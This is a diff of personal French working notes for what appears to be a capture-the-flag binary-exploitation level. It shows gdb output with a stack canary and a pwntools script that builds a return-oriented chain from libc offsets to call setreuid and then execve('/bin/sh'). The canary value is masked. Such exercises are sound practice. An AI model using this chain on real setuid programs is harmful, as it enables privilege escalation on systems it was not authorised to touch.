@@ -1,5 +1,5 @@
-NON FINIS
-CANARY
+FONCTIONNE MAIS GDB NE PEUT PAS OUVRIR LE SHELL ENSUITE, IL FAUT TROUVER UNE SOLUTION POUR RECUPERER 
+LE CANARY DEPUIS PYTHON
 
 (gdb) run < /tmp/payload
 The program being debugged has been started already.
@@ -12,51 +12,47 @@ Breakpoint 1, 0x0000000000401664 in main ()
 0x7ffff7fb4768:	0x37b7bc57c1091d00 <------- VOIR ************* il faut ajouter a la place de 'ICI AJOUTER'
 et ensuite on peut continuer: 'c'
 (gdb) c
-Continuing.
-  [VILLA STRAYLIGHT] Access restricted.
-  [3JANE] Convince me.
-[3JANE] Request ID: [3JANE] Logging: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-[3JANE] Access code: [3JANE] Access denied.
-*** stack smashing detected ***: terminated
 
-Program received signal SIGABRT, Aborted.
-__pthread_kill_implementation (no_tid=0, signo=6, threadid=<optimized out>) at ./nptl/pthread_kill.c:44
-warning: 44	./nptl/pthread_kill.c: No such file or directory
-(gdb) 
-
-********
-a la place de gadget
-on doit faire comme level5
-$1 = {void (void)} 0x7ffff7cef030 <__GI_execve>
-(gdb) p exit
-$2 = {void (int)} 0x7ffff7c47ba0 <__GI_exit>
-(gdb) p setreuid
-$3 = {int (uid_t, uid_t)} 0x7ffff7d27370 <__setreuid>
-avec libc = 0x7ffff7c00000
-
-#######################
-pop rdi
-1023
-pop rsi
-1023
-0
-addrsetreuid
-
-pop rdi
-addrshell
-pop rsi
-0 * 2
-pop rdx 0 * 5
-addrexecve
-addrexit
-
-python3 -c "
-from pwn import *
+python3 -c "from pwn import *
 offset = 199
-gadget = 0x7ffff7cef5ce
-payload = b'A'*offset
-payload += p64(*********************)
-payload += b'B'*8
-payload += p64(#####################)
-open('/tmp/payload','wb').write(payload)
+libc            = 0x7ffff7c00000
+addr_execve     = libc + 0xef030
+addr_setreuid   = libc + 0x127370
+addr_exit       = libc + 0x47ba0
+addr_shell      = libc + 0x1cc42f
+
+ret             = libc + 0x28a92
+pop_rdi         = libc + 0x10c08d
+pop_rsi         = libc + 0x10f889
+pop_rdx         = libc + 0xb513c
+
+payload  = b'A' * offset
+payload += p64(*****************)
+payload += b'B' * 8
+payload += p64(ret)
+
+# setreuid(1023, 1023)
+payload += p64(pop_rdi)
+payload += p64(1023)
+payload += p64(pop_rsi)
+payload += p64(1023)
+payload += p64(0)
+payload += p64(addr_setreuid)
+
+# execve("/bin/sh", NULL, NULL)
+payload += p64(pop_rdi)
+payload += p64(addr_shell)
+payload += p64(pop_rsi)
+payload += p64(0)
+payload += p64(0)
+payload += p64(pop_rdx)
+payload += p64(0)
+payload += p64(0)
+payload += p64(0)
+payload += p64(0)
+payload += p64(0)
+payload += p64(addr_execve)
+payload += p64(addr_exit)
+
+open('/tmp/payload','wb').write(payload)"
 "
